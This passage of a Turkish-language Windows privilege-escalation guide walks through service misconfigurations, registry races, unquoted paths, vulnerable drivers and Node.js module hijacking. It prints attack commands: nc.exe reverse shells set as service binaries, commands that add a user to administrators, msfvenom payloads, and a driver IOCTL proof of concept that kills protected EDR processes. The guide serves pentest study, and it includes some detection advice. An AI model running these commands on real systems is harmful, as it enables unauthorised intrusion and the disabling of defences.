Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

## Services

Service Triggers, belirli koşullar gerçekleştiğinde Windows'un bir servisi başlatmasını sağlar (named pipe/RPC endpoint etkinliği, ETW events, IP kullanılabilirliği, device arrival, GPO refresh vb.). SERVICE_START izinleri olmasa bile, trigger'larını tetikleyerek ayrıcalıklı servisleri çoğu zaman başlatabilirsiniz. Enumeration ve activation tekniklerine buradan bakın:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir service hakkında bilgi edinmek için **sc** kullanabilirsiniz.
```bash
sc qc <service_name>
```
Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_ tarafından sağlanan **accesschk** binary’sine sahip olunması önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğinin kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Servisi etkinleştirme

(örneğin SSDPSRV ile) şu hatayı alıyorsanız:

_Sistem hatası 1058 oluştu._\
_Servis başlatılamıyor; çünkü devre dışı bırakılmış veya etkinleştirilmiş hiçbir ilişkili cihaz yok._

Aşağıdakini kullanarak etkinleştirebilirsiniz:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1 için upnphost hizmetinin çalışması SSDPSRV'ye bağlıdır**

Bu sorunun **başka bir geçici çözümü** şunu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin çalıştırılabilir binary'sini değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Service binary yeniden yapılandırmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve service configuration değişikliklerine olanak tanır.
- **WRITE_OWNER**: Sahiplik edinmeye ve izinleri yeniden yapılandırmaya olanak tanır.
- **GENERIC_WRITE**: Service configuration değiştirme yeteneğini miras alır.
- **GENERIC_ALL**: Ayrıca service configuration değiştirme yeteneğini miras alır.

Bu vulnerability'nin detection ve exploitation işlemleri için _exploit/windows/local/service_permissions_ kullanılabilir.

### Services binaries weak permissions

Bir service **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya privileged bir domain account olarak çalışıyorsa, ancak **low-privileged users service EXE'sini veya üst klasörünü değiştirebiliyorsa**, service çoğu zaman **binary'yi değiştirip service'i yeniden başlatarak** hijack edilebilir.

**Bir service tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi** veya binary'nin bulunduğu **klasörde write permissions** sahibi olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir service tarafından çalıştırılan tüm binary'leri **wmic** (system32 içinde olmayan) kullanarak alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** tarafından verilen tehlikeli ACL'leri, özellikle hizmet çalıştırılabilir dosyası veya bu dosyayı içeren dizin üzerinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Pratik bir kötüye kullanım akışı:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve çalıştırılabilir dosya yolunu doğrulayın.
2. `icacls <path>` ile binary'nin yazılabilir olduğunu doğrulayın.
3. Hizmet binary'sini bir payload veya geçerli bir kötü amaçlı hizmet binary'si ile değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Hizmet, normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlatılıp başlatılmadığını, bir failure action ile yeniden başlatılıp başlatılmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemeyeceğini kontrol edin.

### Hizmet kayıt defterini değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** hesaplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, service tarafından çalıştırılan binary değiştirilebilir.

service tarafından çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Kayıt defteri sembolik bağlantı yarış koşulu ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** işlemi tarafından bir HKLM oturum anahtarına kopyalanan, kullanıcı başına **ATConfig** anahtarları oluşturur. Bir kayıt defteri **symbolic link race**, bu ayrıcalıklı yazmayı **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **value write** primitive'i sağlayabilir.<sup>[[18]](#references)</sup>

Ana konumlar (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü Accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, logon/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini doldurun.
2. Güvenli masaüstü kopyalamasını tetikleyin (ör. **LockWorkstation**); bu işlem AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** yerleştirerek **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını, korumalı bir HKLM hedefini gösteren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM value write elde ettikten sonra servis yapılandırma değerlerinin üzerine yazarak LPE'ye pivot edin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir servis seçin (ör. **`msiserver`**) ve yazma işleminden sonra servisi tetikleyin. **Not:** public exploit implementation, yarışın bir parçası olarak **locks the workstation** işlemini gerçekleştirir.

Örnek tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, bu **bu registry altında alt registry'ler oluşturabileceğiniz** anlamına gelir. Windows services söz konusu olduğunda bu, **arbitrary code çalıştırmak için yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak işaretleri içinde değilse Windows, boşluktan önce biten her ifadeyi çalıştırmayı deneyecektir.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı deneyecektir:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listeleyin:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Bu zafiyeti** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir service başarısız olduğunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine olanak tanır. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmî belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Uygulamalar

### Yüklü Uygulamalar

**binary'lerin izinlerini** (belki birinin üzerine yazıp privilege escalation gerçekleştirebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)) kontrol edin.
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okuyabilmek için bir yapılandırma dosyasını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik olarak yükler. Yazılabilir bir portable/kopya kurulum mevcutsa, kötü amaçlı bir plugin bırakmak her başlatmada ( `DllMain` ve plugin callback'leri dahil) `notepad++.exe` içinde otomatik kod yürütülmesini sağlar.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir registry girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Ayrıcalıkları yükseltmek için ilgi çekici autorun konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf garip/zafiyetli** sürücüleri arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Bir driver keyfi kernel okuma/yazma primitive'i (kötü tasarlanmış IOCTL handler'larında yaygındır) sunuyorsa, kernel memory'den doğrudan bir SYSTEM token çalarak privilege escalation gerçekleştirebilirsiniz.<sup>[[13]](#references)</sup> Adım adım teknik için bkz.:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Vulnerable çağrının attacker-controlled bir Object Manager path açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length component'ler veya derin directory chain'leri kullanarak) pencereyi mikrosaniyelerden onlarca mikrosaniyeye genişletebilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE chain'leri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ı leak eden bir **lock-release-before-copy** disclosure.<sup>[[29]](#references)</sup>

Audit ve exploitation notları:

- **Free-under-lock + sonrasında cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşıyorsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam ederek serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geri geçirebilir.
- Serbest bırakılan queue object'ini aynı boyutta, attacker-controlled bir paged-pool allocation ile **yeniden reclaim edin**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve size kontrol edilebilir ve daha sonra pipe read/peek operasyonlarıyla probe edilebilir. Serbest bırakılan object list link'leri içeriyorsa, bunları **user memory'de fake request node'larından oluşan cyclic list** ile overwrite edin; böylece driver, original list head'de sonlanmak yerine attacker-defined request structure'larını tekrar tekrar işler.
- **Predictable write'ı yükseltin**: fake request, bookkeeping write'larında kullanılan nested context pointer'ını (timestamps / QPC / refcount-adjacent field'lar) yönlendiriyorsa, **address-controlled ancak value-controlled olmayan** bir kernel write elde edebilirsiniz. Bu durumda final code/data pointer yerine sprayed pool object'in **length/size** field'ını hedefleyin; ardından corrupted object'in **out-of-bounds paged-pool read** sağlamasına kadar spray'i enumerate edin.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan herhangi bir syscall güçlü bir adaydır. Attacker'ın copied buffer'ı büyütebilmesi (örneğin serializer'ın final allocation size'ını artıran çok sayıda list/resource entry ekleyerek) reliability'yi artırır; çünkü daha uzun copy, makinenin crash olmasına gerek kalmadan replacement window'ı genişletir.
- **Pointer-rich refill target'ları**: Windows **I/O ring** registered-buffer array'leri mükemmel disclosure target'larıdır; çünkü paged-pool size attacker-controlled'dır (`8 * regBufferCnt`) ve her element bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'dır. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i recover edin, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini corrupt ederek sonraki I/O ring operasyonlarının attacker-forged entry'leri tüketmesini ve arbitrary kernel read/write sağlamasını mümkün kılın. Mevcut write yalnızca stable bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` değerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned write**'lar kullanın, bunu `VirtualAlloc` ile map edin ve forged registered-buffer array'i buraya yerleştirin.<sup>[[30]](#references)</sup>

Faydalı debugging göstergeleri:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Bozuk I/O ring üzerinden arbitrary kernel read/write elde ettiğinizde, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive güvenlik açıkları, deterministik yerleşimleri hazırlamanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve özel bir driver olmadan metadata corruption'ı kernel paged-pool taşmalarına dönüştürmenize olanak tanır. Tüm zinciri burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `int readValue` gibi bir stack scalar'ına `RTL_QUERY_REGISTRY_DIRECT` ile gerçekleştirir. `RTL_QUERY_REGISTRY_TYPECHECK` eksikse, `EntryContext` geliştiricinin beklediği türe göre değil, **gerçek** registry türüne göre yorumlanır.

Bu durum iki kullanışlı primitive oluşturur:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı tarafından kontrol edilen mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği key'leri sorgulamasına, return code/log'lar üzerinden varlıklarını leak etmesine ve bazı durumlarda caller'ın doğrudan erişemeyeceği value'ları okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar destination, registry value türüne bağlı olarak type-confused şekilde `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak yorumlanır.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_DIRECT` ile fakat `RTL_QUERY_REGISTRY_TYPECHECK` olmadan bir **untrusted hive**'a ulaşırsa kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploitability'yi korumak için value'ları `HKCU` altında hazırlamak yerine **trusted system hive**'lar içindeki **attacker-writable key**'leri arayın.
- **Trusted-hive staging**: Yazılabilir `\Registry\Machine` alt anahtarlarını enumerate etmek için NtObjectManager kullanın ve sandbox'lı context'lerden erişilebilen key'leri bulmak üzere taramayı duplicate edilmiş bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte bir `int` içine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext` değerinin bir `UNICODE_STRING` işaret etmesini bekler. Kod önce attacker-controlled bir `REG_DWORD` değerini stack scalar'ına yükler ve ardından aynı buffer'ı string okuması için yeniden kullanırsa attacker `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; bu da kısmen kontrol edilen bir kernel write ile sonuçlanır.
- **`REG_BINARY`**: büyük binary veriler için direct mode, `EntryContext` konumundaki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar içinde **negative** ve attacker-controlled bir değer bırakırsa sonraki `REG_BINARY` sorgusu attacker bytes değerlerini doğrudan bitişik stack slot'larının üzerine kopyalar; bu da çoğu zaman callback-pointer overwrite için en temiz yoldur.

Güçlü hunting pattern: **aynı stack variable içine, yeniden başlatmadan, heterogeneous registry reads yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'leri için Grep kullanın.

#### Device object'lerde eksik FILE_DEVICE_SECURE_OPEN değerini abuse etme (LPE + EDR kill)

Bazı signed third-party driver'lar, IoCreateDeviceSecure aracılığıyla güçlü bir SDDL ile device object oluşturur ancak DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN değerini ayarlamayı unutur. Bu flag olmadan secure DACL, device extra component içeren bir path üzerinden açıldığında uygulanmaz; böylece herhangi bir unprivileged user aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir vaka)

Bir user device'ı açabildiğinde, driver tarafından sunulan privileged IOCTL'ler LPE ve tampering için abuse edilebilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
- Arbitrary process'lere full-access handle döndürme (token theft / DuplicateTokenEx/CreateProcessAsUser aracılığıyla SYSTEM shell).
- Kısıtlanmamış raw disk read/write (offline tampering, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil arbitrary process'leri terminate etme; böylece user land üzerinden kernel aracılığıyla AV/EDR kill.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için Mitigations
- DACL tarafından kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarlayın.
- Privileged operation'lar için caller context'i doğrulayın. Process termination veya handle return'lerine izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTL'leri (access mask'leri, METHOD_*, input validation) kısıtlayın ve doğrudan kernel privileges yerine brokered modelleri değerlendirin.

Defenders için Detection fikirleri
- Şüpheli device name'lerine (ör. \\ .\\amsdk*) yönelik user-mode open işlemlerini ve abuse göstergesi olan belirli IOCTL sequence'lerini izleyin.
- Microsoft'un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) zorunlu kılın ve kendi allow/deny list'lerinizi yönetin.


## PATH DLL Hijacking

**PATH üzerinde bulunan bir folder içinde write permissions'a** sahipseniz, bir process tarafından yüklenen DLL'i hijack ederek **privileges escalate** edebilirsiniz.<sup>[[2]](#references)</sup>

PATH içindeki tüm folder'ların permissions'larını kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu check'in nasıl abuse edileceği hakkında daha fazla bilgi için:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Bu, `require("foo")` gibi bare import gerçekleştiren ve beklenen module **missing** olduğunda etkilenen **Node.js** ve **Electron** uygulamalarını hedefleyen bir **Windows uncontrolled search path** varyantıdır.<sup>[[20]](#references)</sup>

Node, directory tree boyunca yukarı çıkarak ve her parent üzerindeki `node_modules` klasörlerini kontrol ederek package'ları resolve eder. Windows'ta bu arama drive root'a kadar ulaşabilir; bu nedenle `C:\Users\Administrator\project\app.js` üzerinden başlatılan bir uygulama şu yolları probe edebilir:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Bir **low-privileged user** `C:\node_modules` oluşturabiliyorsa, kötü amaçlı bir `foo.js` (veya package folder) yerleştirebilir ve **higher-privileged Node/Electron process**'in missing dependency'yi resolve etmesini bekleyebilir. Payload, victim process'in security context'i içinde çalışır; bu nedenle hedef administrator olarak, elevated scheduled task/service wrapper üzerinden veya auto-started privileged desktop app olarak çalıştığında bu durum **LPE**'ye dönüşür.

Bu durum özellikle şu koşullarda yaygındır:

- bir dependency `optionalDependencies` içinde tanımlandığında<sup>[[22]](#references)</sup>
- bir third-party library `require("foo")` çağrısını `try/catch` içine alıp hata durumunda devam ettiğinde
- bir package production build'lerinden kaldırıldığında, packaging sırasında dahil edilmediğinde veya yüklenemediğinde
- güvenlik açığı bulunan `require()` ana application code'u yerine dependency tree'nin derinlerinde yer aldığında

### Hunting vulnerable targets

Resolution path'i kanıtlamak için **Procmon** kullanın:<sup>[[23]](#references)</sup>

- `Process Name` = hedef executable (`node.exe`, Electron app EXE'si veya wrapper process) olacak şekilde filtreleyin
- `Path` `contains` `node_modules` olacak şekilde filtreleyin
- `NAME NOT FOUND` olaylarına ve `C:\node_modules` altındaki son başarılı open işlemine odaklanın

Unpacked `.asar` dosyalarında veya application source'larında kullanılabilecek faydalı code-review pattern'leri:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon veya kaynak incelemesinden **eksik paket adını** belirleyin.
2. Henüz mevcut değilse root lookup dizinini oluşturun:
```powershell
mkdir C:\node_modules
```
3. Beklenen tam ada sahip bir modül bırakın:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Kurban uygulamayı tetikleyin. Uygulama `require("foo")` çalıştırır ve meşru modül mevcut değilse Node, `C:\node_modules\foo.js` dosyasını yükleyebilir.

Bu modele uyan eksik optional modüllere gerçek dünya örnekleri arasında `bluebird` ve `utf-8-validate` bulunur; ancak yeniden kullanılabilir olan kısım **tekniktir**: ayrıcalıklı bir Windows Node/Electron sürecinin çözümleyeceği herhangi bir **eksik bare import** bulun.

### Tespit ve hardening fikirleri

- Bir kullanıcının `C:\node_modules` oluşturması veya buraya yeni `.js` dosyaları/paketleri yazması durumunda uyarı verin.
- Yüksek bütünlük düzeyine sahip süreçlerin `C:\node_modules\*` konumundan okuma yapıp yapmadığını araştırın.
- Production ortamında tüm runtime bağımlılıklarını paketleyin ve `optionalDependencies` kullanımını denetleyin.
- Üçüncü taraf kodlarını sessiz `try { require("...") } catch {}` kalıpları açısından inceleyin.
- Kütüphane destekliyorsa optional probe'ları devre dışı bırakın (örneğin bazı `ws` dağıtımları, `WS_NO_UTF_8_VALIDATE=1` ile eski `utf-8-validate` probe'unu önleyebilir).

## Network

### Shares
```bash
